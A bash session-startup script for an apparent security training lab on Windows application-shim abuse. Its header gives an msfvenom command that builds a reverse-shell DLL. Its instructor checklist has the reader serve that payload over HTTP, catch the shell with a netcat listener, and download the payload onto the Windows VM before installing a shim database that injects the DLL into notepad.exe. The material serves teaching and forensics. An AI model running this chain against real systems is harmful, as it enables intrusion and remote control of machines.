#!/bin/bash
# =============================================================================
#  lab_start.sh  —  SdbExplorer Lab  |  Per-session startup
# =============================================================================
#  Run this at the beginning of EACH lab session, after ubuntu_setup.sh has
#  been run at least once.
#
#  What this script does:
#    1. Verifies ubuntu_setup.sh was run (patch.sdb, sdb-explorer.exe present)
#    2. Verifies evil.dll is in place (see NOTE below)
#    3. Detects the current Ubuntu VM IP address
#    4. Displays a session summary and next-step checklist for the instructor
#
#  ─── evil.dll ────────────────────────────────────────────────────────────────
#  evil.dll must be generated MANUALLY before running this script.
#  It is IP-dependent (the callback address is compiled in), so it must be
#  regenerated every time the Ubuntu VM's IP address changes.
#
#  Generate it with msfvenom (part of Metasploit Framework) by running:
#
#    UBUNTU_IP=$(hostname -I | awk '{print $1}')
#    msfvenom -p windows/x64/shell_reverse_tcp \
#        LHOST="$UBUNTU_IP" LPORT=4444 \
#        -f dll \
#        -o ~/BnB/SdbExplorer/evil.dll
#
#  Then re-run this script to confirm everything is in order.
#  ─────────────────────────────────────────────────────────────────────────────
# =============================================================================

set -euo pipefail

# ─── Colours ──────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

info()    { echo -e "${CYAN}[*]${NC} $*"; }
success() { echo -e "${GREEN}[+]${NC} $*"; }
warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
error()   { echo -e "${RED}[ERROR]${NC} $*" >&2; }
die()     { error "$*"; exit 1; }
sep()     { echo -e "${BOLD}────────────────────────────────────────────${NC}"; }

LAB_DIR="$HOME/BnB/SdbExplorer"

# =============================================================================
#  STEP 1 — Check setup was run
# =============================================================================
echo ""
echo -e "${BOLD}════════════════════════════════════════════${NC}"
echo -e "${BOLD}   SdbExplorer Lab — Session Start Script   ${NC}"
echo -e "${BOLD}════════════════════════════════════════════${NC}"
echo ""

info "Checking lab directory: $LAB_DIR"
if [[ ! -d "$LAB_DIR" ]]; then
    die "Lab directory not found. Run ubuntu_setup.sh first."
fi

# =============================================================================
#  STEP 2 — Verify all three required files
# =============================================================================
echo ""
sep
info "File verification"
sep
echo ""

ALL_OK=true

check_file() {
    local file="$LAB_DIR/$1"
    local label="$2"
    local hint="$3"
    if [[ -f "$file" ]]; then
        local size
        size=$(du -h "$file" | cut -f1)
        success "$1  ($size)  ✓  — $label"
    else
        warn    "$1  ✗  MISSING  — $label"
        if [[ -n "$hint" ]]; then
            echo    "             $hint"
        fi
        ALL_OK=false
    fi
}

check_file "patch.sdb" \
    "Shim Database (InjectDll → notepad.exe)" \
    "→ Run ubuntu_setup.sh to regenerate"

check_file "sdb-explorer.exe" \
    "Forensic SDB parser (Windows executable)" \
    "→ See ubuntu_setup.sh for download instructions"

check_file "evil.dll" \
    "Reverse shell payload (Windows DLL)" \
    "→ Generate manually — see header of this script for the msfvenom command"

echo ""

if [[ "$ALL_OK" == false ]]; then
    echo -e "${YELLOW}${BOLD}One or more files are missing. Resolve issues above before starting the lab.${NC}"
    echo ""
    exit 1
fi

# =============================================================================
#  STEP 3 — Detect current Ubuntu IP
# =============================================================================
sep
info "Network"
sep
echo ""

# Try to get the primary non-loopback IPv4 address
UBUNTU_IP=$(ip -4 route get 1.0.0.0 2>/dev/null | awk '{print $7; exit}' || true)

# Fallback: pick the first non-loopback interface address
if [[ -z "$UBUNTU_IP" ]]; then
    UBUNTU_IP=$(hostname -I | tr ' ' '\n' | grep -v '^127\.' | head -1)
fi

if [[ -z "$UBUNTU_IP" ]]; then
    warn "Could not auto-detect IP. Check your network connection."
    warn "Run manually:  ip a"
    UBUNTU_IP="<COULD_NOT_DETECT>"
else
    success "Ubuntu VM IP:  ${BOLD}$UBUNTU_IP${NC}"
fi

echo ""

# ── Warn if evil.dll callback address might not match ──────────────────────────
info "Verifying evil.dll callback address..."

# Extract printable strings from evil.dll and search for the IP pattern.
# This is a heuristic — works for msfvenom payloads where LHOST is stored
# as a plain IPv4 address in the binary.
if command -v strings &>/dev/null; then
    EMBEDDED_IP=$(strings "$LAB_DIR/evil.dll" 2>/dev/null \
        | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' \
        | grep -v '^127\.' \
        | grep -v '^0\.' \
        | head -1 || true)

    if [[ -n "$EMBEDDED_IP" && "$EMBEDDED_IP" != "$UBUNTU_IP" ]]; then
        echo ""
        warn "Mismatch detected!"
        warn "  evil.dll callback : $EMBEDDED_IP"
        warn "  Current Ubuntu IP : $UBUNTU_IP"
        warn ""
        warn "The payload will call back to the WRONG address."
        warn "Regenerate evil.dll for this session — see the header of this script."
        echo ""
        exit 1
    elif [[ -n "$EMBEDDED_IP" ]]; then
        success "Callback address in evil.dll matches current IP  ✓"
    else
        warn "Could not extract callback IP from evil.dll (normal for encoded payloads)."
        warn "Make sure evil.dll was built with LHOST=$UBUNTU_IP"
    fi
else
    warn "'strings' utility not found — skipping evil.dll IP verification."
    warn "Ensure evil.dll was built for LHOST=$UBUNTU_IP"
fi

echo ""

# =============================================================================
#  STEP 4 — Session summary
# =============================================================================
sep
echo -e "${GREEN}${BOLD}  Lab Ready — Session Summary${NC}"
sep
echo ""
echo -e "  ${BOLD}Ubuntu VM IP   :${NC}  $UBUNTU_IP"
echo -e "  ${BOLD}Lab directory  :${NC}  $LAB_DIR"
echo ""
echo -e "  ${BOLD}Files ready to serve:${NC}"
ls -lh "$LAB_DIR"
echo ""

# =============================================================================
#  STEP 5 — Phase 2 checklist (instructor reminder)
# =============================================================================
sep
echo -e "${BOLD}  Phase 2 checklist — open these in separate terminals:${NC}"
sep
echo ""
echo -e "  ${CYAN}Terminal 1${NC} — Python web server (hosts payload files for Windows):"
echo -e "    cd $LAB_DIR"
echo -e "    python3 -m http.server 8001"
echo ""
echo -e "  ${CYAN}Terminal 2${NC} — Netcat listener (catches the reverse shell):"
echo -e "    nc -lvnp 4444"
echo ""
echo -e "  ${CYAN}Windows VM${NC} — use IP: ${BOLD}$UBUNTU_IP${NC}"
echo -e "    Invoke-WebRequest -Uri \"http://${UBUNTU_IP}:8001/evil.dll\"       -OutFile \"C:\\Users\\Public\\evil.dll\""
echo -e "    Invoke-WebRequest -Uri \"http://${UBUNTU_IP}:8001/patch.sdb\"     -OutFile \"\$env:TEMP\\patch.sdb\""
echo -e "    Invoke-WebRequest -Uri \"http://${UBUNTU_IP}:8001/sdb-explorer.exe\" -OutFile \"C:\\Users\\Public\\sdb-explorer.exe\""
echo -e "    sdbinst.exe \"\$env:TEMP\\patch.sdb\""
echo ""
sep
echo ""
